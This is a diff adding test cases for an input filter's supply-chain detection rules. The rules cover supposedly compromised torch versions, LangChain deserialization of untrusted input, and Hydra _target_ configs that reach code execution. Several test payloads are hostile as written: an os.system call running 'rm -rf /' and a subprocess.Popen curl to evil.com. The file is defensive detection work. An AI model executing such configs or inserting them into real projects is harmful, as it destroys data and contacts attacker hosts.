@@ -433,3 +433,53 @@ class TestSupplyChainPatterns:
         payload = "pip install litellm==1.83.0"
         score, level, matched = filter_input(payload)
         assert not any(r.rule_id == "sc_compromised_pkg_version" for r in matched)
+
+    def test_compromised_pkg_version_torch_251(self):
+        payload = "pip install torch==2.5.1"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_compromised_pkg_version" for r in matched)
+
+    def test_compromised_pkg_version_torch_250(self):
+        payload = "requirements.txt: torch==2.5.0"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_compromised_pkg_version" for r in matched)
+
+    def test_safe_torch_version_not_flagged(self):
+        payload = "pip install torch==2.6.0"
+        score, level, matched = filter_input(payload)
+        assert not any(r.rule_id == "sc_compromised_pkg_version" for r in matched)
+
+    def test_langchain_deserialization_loads_call(self):
+        payload = "data = langchain_core.loads(user_json)"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_langchain_deserialization" for r in matched)
+
+    def test_langchain_deserialization_lc_key(self):
+        payload = 'payload = {"lc": "1", "type": "LLMChain", "graph": {"nodes": []}}'
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_langchain_deserialization" for r in matched)
+
+    def test_langchain_deserialization_import_pattern(self):
+        payload = "from langchain_core.load import loads; obj = loads(untrusted_input)"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_langchain_deserialization" for r in matched)
+
+    def test_hydra_target_rce_os_system(self):
+        payload = "_target_: os.system\nargs: ['rm -rf /']"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_hydra_target_rce" for r in matched)
+
+    def test_hydra_target_rce_subprocess(self):
+        payload = "_target_: subprocess.Popen\nargs: [['curl', 'http://evil.com']]"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_hydra_target_rce" for r in matched)
+
+    def test_hydra_target_rce_importlib(self):
+        payload = "_target_: importlib.import_module\nmodule: malicious_pkg"
+        score, level, matched = filter_input(payload)
+        assert any(r.rule_id == "sc_hydra_target_rce" for r in matched)
+
+    def test_hydra_target_safe_not_flagged(self):
+        payload = "_target_: torch.nn.Linear\nin_features: 128\nout_features: 64"
+        score, level, matched = filter_input(payload)
+        assert not any(r.rule_id == "sc_hydra_target_rce" for r in matched)
